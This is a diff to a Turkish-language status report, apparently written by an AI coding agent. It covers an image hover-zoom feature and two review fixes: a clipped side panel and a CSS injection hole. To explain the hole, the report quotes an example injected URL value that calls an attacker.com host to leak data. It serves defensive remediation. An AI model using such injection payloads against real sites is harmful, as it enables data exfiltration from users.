@@ -4,7 +4,7 @@
 **Plan:** `docs/superpowers/plans/2026-05-13-image-hover-zoom.md`
 **Spec:** `docs/superpowers/specs/2026-05-13-image-hover-zoom-design.md`
 **Branch:** `feat/image-hover-zoom`
-**Sonuç:** ✅ Code-side hazır — kullanıcı browser smoke testi bekleniyor
+**Sonuç:** ✅ Code-side hazır (2 P0 düzeltildi) — kullanıcı browser smoke testi bekleniyor
 
 ## Commit listesi (main..HEAD)
 
@@ -59,9 +59,33 @@ Agent ortamda browser test yapamaz. Bu adımları sen koşturmalısın:
 - Klavye pan (ok tuşları ile lens hareketi)
 - High-res variant generation (`@2x` görseller)
 
+## Code-Review Düzeltmeleri (2026-05-13)
+
+İlk implementasyon sonrası bağımsız `superpowers:code-reviewer` agent 2 P0 buldu:
+
+**P0-1: overflow-hidden side panel'i kırpıyordu.** `product-gallery.tsx` ana wrapper'ında `overflow-hidden rounded-2xl` var. ZoomImage'in side panel'i `position:absolute; left-full` ile bu kabın sağ kenarına yerleşiyordu — tamamen kırpılıp görünmez kalıyordu. Özellik production'da çalışmazdı.
+
+**Düzeltme:** Side panel artık **React Portal** ile `document.body`'ye render ediliyor (`createPortal`). `position:fixed` + `getBoundingClientRect`'ten hesaplanan viewport koordinatları kullanılıyor — herhangi bir parent'ın overflow-hidden'ından kaçar. Bonus: panel viewport sağına sığmazsa otomatik olarak resmin SOLuna geçer (responsive).
+
+**P0-2: CSS injection riski (`url(${src})` tırnaksız).** Background-image template literal'inde URL tırnaksız ve escape edilmeden yazılıyordu. Kötü niyetli admin URL'i `https://x.com/a.png) ; background:url(http://attacker.com/leak.png?x=` ile CSS deklarasyonunu kırıp ek kural enjekte edebilirdi.
+
+**Düzeltme:** İki yardımcı eklendi (`lib/products/zoom-math.ts`):
+- `isHttpsUrl(s)` — yalnızca `https://` URL'leri kabul eder (`javascript:`, `data:`, `http:`, relative path hepsi reddedilir)
+- `escapeCssUrl(s)` — `\` `"` `(` `)` karakterlerini URL-encode eder
+
+Birlikte: `backgroundImage: url("${safeBgSrc}")` artık güvenli; non-HTTPS src'lerde panel hiç render edilmez. 11 yeni TDD test eklendi (URL validation 6 + escape 5).
+
+**Yeni doğrulama:**
+| Komut | Sonuç |
+|---|---|
+| `pnpm vitest run` | **211/211 PASS** (önceki 200 + 11 yeni güvenlik testi) |
+| `pnpm exec tsc --noEmit` | 0 hata |
+| `pnpm lint` | 0 error, 2 pre-existing warning |
+| `pnpm build` | PASS |
+
 ## Bir sonraki adım
 
-- Bağımsız code-review (`superpowers:code-reviewer` agent ile)
-- Kullanıcı manuel smoke testi
+- İkinci tur code-review (P0 fix doğrulama)
+- Kullanıcı manuel smoke testi (özellikle: side panel artık görünüyor mu? Panel resmin solunda da düzgün açılıyor mu?)
 - Onay sonrası `main`'e `--no-ff` merge
 - Memory güncelle: `project_ux_consistency_sweep.md`'ye image hover-zoom kapandığını ekle
